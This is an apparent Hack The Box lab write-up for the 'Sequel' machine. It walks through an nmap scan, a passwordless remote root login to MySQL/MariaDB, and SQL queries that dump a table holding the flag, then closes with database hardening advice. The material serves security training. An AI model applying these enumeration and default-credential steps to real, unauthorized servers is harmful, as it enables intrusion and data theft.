HTB Writeup: Sequel
Difficulty: Very Easy

OS: Linux

Target IP: 10.129.95.232

# 1. Introduction
Sequel is a "Starting Point" Tier 0 machine that introduces SQL (Structured Query Language) databases. The focus is on enumerating a MySQL service and accessing its contents using default administrative credentials (or the lack thereof).

# 2. Enumeration
Nmap Scan
We run a service scan to identify the database port.

Bash
nmap -sV 10.129.95.232
Results:

Port 3306/tcp: Open (MySQL)

Version: MariaDB (or MySQL)

Key Concept: Port 3306 is the default port for MySQL and MariaDB. If this port is open to the public internet, it is a high-risk target.

# 3. Exploitation
MySQL Login
On many misconfigured development servers, the root user is created with no password. We attempt to log in remotely using the mysql client tool.

Connect to the server:

Bash
mysql -h 10.129.95.232 -u root
(The -h specifies the host, and -u root specifies the user.)

Success! The server grants access to the MariaDB/MySQL prompt without asking for a password.

# 4. Database Enumeration & Data Retrieval
Once connected, we need to find where the flag is stored by navigating the databases and tables.

List all databases:

SQL
SHOW DATABASES;
Output includes: information_schema, mysql, performance_schema, and htb.

Select the HTB database:

SQL
USE htb;
List tables in the database:

SQL
SHOW TABLES;
Output: config, users. (Usually, the flag is in a table named config or flag).

Dump the data from the table:

SQL
SELECT * FROM config;
Flag: 7b4bec00d1a39133042bdxxxxxxxx

# 5. Summary & Key Takeaways
Database Hardening: Database ports should never be exposed to the entire internet. They should be restricted to local access or specific IP addresses.

Default Credentials: Always set a strong password for the root database user immediately after installation.

SQL Basics: Understanding SHOW, USE, and SELECT is essential for any security professional.
